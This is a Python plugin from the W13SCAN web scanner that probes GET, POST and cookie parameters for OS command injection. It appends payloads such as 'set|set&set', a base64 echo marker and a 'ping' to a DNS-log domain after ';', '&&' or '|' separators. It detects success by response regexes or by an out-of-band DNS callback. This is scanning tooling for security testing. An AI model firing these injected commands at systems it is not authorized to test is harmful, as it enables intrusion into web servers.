#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 10:48 AM
# @Author  : w8ay
# @File    : command_system.py
import copy
import random
import re

import requests

from lib.api.dnslog import DnsLogApi
from lib.api.reverse_api import reverseApi
from lib.core.common import paramsCombination, generateResponse, random_str
from lib.core.data import conf
from lib.core.enums import OS, HTTPMETHOD, PLACE, VulType
from lib.core.plugins import PluginBase
from lib.core.settings import acceptedExt


class W13SCAN(PluginBase):
    name = '系统命令注入'
    desc = '''测试系统命令注入，支持Windows/Linux,回显型的命令注入'''

    def audit(self):
        headers = self.requests.headers
        url = self.requests.url

        if self.requests.suffix not in acceptedExt and conf.level < 4:
            return

        randint = random.randint(1000, 9000)
        url_flag = {
            "set|set&set": [
                'Path=[\s\S]*?PWD=',
                'Path=[\s\S]*?PATHEXT=',
                'Path=[\s\S]*?SHELL=',
                'Path\x3d[\s\S]*?PWD\x3d',
                'Path\x3d[\s\S]*?PATHEXT\x3d',
                'Path\x3d[\s\S]*?SHELL\x3d',
                'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
                'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
                'Non-authoritative\sanswer:\s+Name:\s*',
                'Server:\s*.*?\nAddress:\s*'
            ],
            "echo `echo 6162983|base64`6162983".format(randint): [
                "NjE2Mjk4Mwo=6162983"
            ]
        }
        if OS.WINDOWS in self.response.os:
            del url_flag["echo `echo 6162983|base64`6162983".format(randint)]

        # 无回显 payload
        dnslog = DnsLogApi()
        dnsdomain = dnslog.new_domain()
        token = random_str(4)
        dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
        url_flag[dnslog_payload] = []

        # 内置平台 dns payload
        dns = reverseApi()
        if dns.isUseReverse():
            dnsdomain = dns.generate_dns_token()
            dns_token = dnsdomain["token"]
            fullname = dnsdomain["fullname"]
            reverse_payload = "ping -nc 1 {}".format(fullname)
            url_flag[reverse_payload] = []

        iterdatas = []
        if self.requests.method == HTTPMETHOD.GET:
            iterdatas.append((self.requests.params, PLACE.GET))
        elif self.requests.method == HTTPMETHOD.POST:
            iterdatas.append((self.requests.post_data, PLACE.POST))
        if conf.level >= 3:
            iterdatas.append((self.requests.cookies, PLACE.COOKIE))

        for item in iterdatas:
            iterdata, positon = item
            for k, v in iterdata.items():
                data = copy.deepcopy(iterdata)
                for spli in ['', ';', "&&", "|"]:
                    for flag, re_list in url_flag.items():
                        if spli == "":
                            data[k] = flag
                        else:
                            data[k] = v + spli + flag

                        params = paramsCombination(data, positon)
                        if positon == PLACE.GET:
                            r = requests.get(self.requests.netloc, params=params, headers=headers)
                        elif positon == PLACE.POST:
                            r = requests.post(self.requests.url, data=params, headers=headers)
                        elif positon == PLACE.COOKIE:
                            if self.requests.method == HTTPMETHOD.GET:
                                r = requests.get(self.requests.url, headers=headers, cookies=params)
                            elif self.requests.method == HTTPMETHOD.POST:
                                r = requests.post(self.requests.url, data=self.requests.post_data, headers=headers,
                                                  cookies=params)
                        html1 = r.text
                        for rule in re_list:
                            if re.search(rule, html1, re.I | re.S | re.M):
                                result = self.new_result()
                                result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                                result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                                  "执行payload:{} 并发现正则回显{}".format(data[k], rule), k, data[k], positon)
                                self.success(result)
                                break
                        if flag == dnslog_payload:
                            dnslist = dnslog.check()
                            if dnslist:
                                result = self.new_result()
                                result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                                result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                                  "执行payload:{} dnslog平台接收到返回值".format(data[k], repr(dnslist)), k,
                                                  data[k],
                                                  positon)
                                self.success(result)
                                break
                        if dns.isUseReverse():
                            if reverse_payload == flag:
                                dnslist = dns.check(dns_token)
                                if dnslist:
                                    result = self.new_result()
                                    result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                                    result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                                      "执行payload:{} dnslog平台接收到返回值".format(data[k], repr(dnslist)), k,
                                                      data[k],
                                                      positon)
                                    self.success(result)
                                    break
